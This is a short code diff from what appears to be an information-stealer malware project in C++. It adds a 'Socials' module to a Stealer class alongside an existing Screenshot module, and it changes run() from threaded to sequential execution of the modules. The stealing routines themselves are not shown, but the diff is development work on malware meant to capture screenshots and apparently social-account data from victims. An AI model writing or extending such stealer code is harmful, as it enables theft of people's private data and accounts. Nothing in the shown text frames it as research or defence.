@@ -4,10 +4,12 @@
 
 #include "Stealer.h"
 #include "impl/Screenshot.h"
+#include "impl/socials/Socials.h"
 #include <thread>
 
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
+    this->modules.push_back(new Socials());
 }
 
 
@@ -24,15 +26,8 @@ Stealer::Stealer() {
 }
 
 void Stealer::run() {
-    std::vector<std::thread> threads;
-
-    for (StealerImpl* module : this->modules) {
-        threads.emplace_back(&StealerImpl::execute, std::ref(module), std::ref(this->root_dir));
-    }
-
-    for (std::thread& thread : threads) {
-        if (thread.joinable()) {
-            thread.join();
-        }
+    for(StealerImpl* module : this->modules)
+    {
+        module->execute(this->root_dir);
     }
 }
